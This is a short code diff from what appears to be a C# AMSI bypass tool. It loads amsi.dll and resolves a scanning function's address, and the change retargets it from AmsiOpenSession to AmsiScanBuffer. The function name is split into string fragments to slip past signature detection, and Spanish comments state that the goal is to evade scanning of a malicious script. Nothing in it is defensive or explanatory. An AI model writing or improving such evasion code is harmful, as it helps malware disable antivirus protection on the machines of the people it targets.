@@ -15,7 +15,7 @@ public class Super
         try
         {
             var library = Win32.LoadLibrary("amsi"); //Cargamos la dll de amsi en memoria y poder modificarla
-            var getaddress = Win32.GetProcAddress(library, "Am" + "si" + "Op" + "en" + "Sess" + "ion"); //Cargamos la posicion en memoria de AmsiScanBuffer
+            var getaddress = Win32.GetProcAddress(library, "Am" + "si" + "Sc" + "an" + "Buff" + "er"); //Cargamos la posicion en memoria de la funcion a evadir (Amsi
             //La funcion amsicanbuffer es la encargada de analizar el buffer donde se mete el script (malware) a analizar
 
             uint oldProtect;
